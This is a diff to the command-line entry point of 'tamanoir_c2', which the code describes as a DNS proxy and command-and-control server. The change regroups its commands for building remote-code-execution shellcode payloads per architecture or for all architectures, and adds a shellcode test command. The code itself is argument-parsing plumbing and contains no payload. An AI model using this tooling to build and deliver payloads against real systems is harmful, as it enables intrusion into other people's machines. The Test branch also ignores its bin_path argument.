@@ -5,7 +5,9 @@ use log::{debug, error, info};
 use tamanoir_c2::{
     builder::build,
     handlers::{add_info, forward_req, init_keymaps, mangle, max_payload_length},
-    select_payload, Engine, Session, TargetArch,
+    select_payload,
+    tester::test_bin,
+    Engine, Session, TargetArch,
 };
 use tamanoir_common::ContinuationByte;
 use tokio::{net::UdpSocket, sync::Mutex};
@@ -17,19 +19,8 @@ struct Opt {
 }
 #[derive(Debug, Subcommand)]
 enum Command {
-    /// Build a shel code payload
-    BuildRce {
-        #[clap(long, default_value = "x86_64")]
-        target_arch: TargetArch,
-        #[clap(short, long, default_value = "docker")]
-        engine: Engine,
-        #[clap(long, default_value = "")]
-        build_vars: String,
-        #[clap(long)]
-        crate_path: String,
-        #[clap(long)]
-        out_dir: String,
-    },
+    #[clap(subcommand)]
+    Rce(RceCommand),
     // start the dns proxy / c2 server
     Start {
         #[clap(short, long, default_value = "53")]
@@ -45,24 +36,83 @@ enum Command {
     },
 }
 
+#[derive(Debug, Subcommand)]
+enum RceCommand {
+    // Build shell code payload for specified architecture
+    Build {
+        #[clap(long, default_value = "x86_64")]
+        target_arch: TargetArch,
+        #[clap(short, long, default_value = "docker")]
+        engine: Engine,
+        #[clap(long, default_value = "")]
+        build_vars: String,
+        #[clap(long)]
+        crate_path: String,
+        #[clap(long)]
+        out_dir: String,
+    },
+    // Build shell code payload for all available aritectures
+    BuildAll {
+        #[clap(short, long, default_value = "docker")]
+        engine: Engine,
+        #[clap(long, default_value = "")]
+        build_vars: String,
+        #[clap(long)]
+        crate_path: String,
+        #[clap(long)]
+        out_dir: String,
+    },
+    // Test a shellcode on current architecture
+    Test {
+        bin_path: String,
+    },
+}
+
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
     let Opt { command } = Opt::parse();
     env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
 
     match command {
-        Command::BuildRce {
-            target_arch,
-            engine,
-            crate_path,
-            build_vars,
-            out_dir,
-        } => {
-            if let Err(e) = build(crate_path, engine, target_arch, build_vars, out_dir) {
-                error!("{}", e);
-                std::process::exit(1);
+        Command::Rce(rce_cmd) => match rce_cmd {
+            RceCommand::Build {
+                target_arch,
+                engine,
+                crate_path,
+                build_vars,
+                out_dir,
+            } => {
+                if let Err(e) = build(crate_path, engine, target_arch, build_vars, out_dir) {
+                    error!("{}", e);
+                    std::process::exit(1);
+                }
             }
-        }
+            RceCommand::Test { bin_path } => {
+                if let Err(e) = test_bin() {
+                    error!("{}", e);
+                    std::process::exit(1);
+                }
+            }
+            RceCommand::BuildAll {
+                engine,
+                crate_path,
+                build_vars,
+                out_dir,
+            } => {
+                for arch in TargetArch::ALL {
+                    if let Err(e) = build(
+                        crate_path.clone(),
+                        engine.clone(),
+                        arch,
+                        build_vars.clone(),
+                        out_dir.clone(),
+                    ) {
+                        error!("{}", e);
+                        std::process::exit(1);
+                    }
+                }
+            }
+        },
         Command::Start {
             port,
             dns_ip,
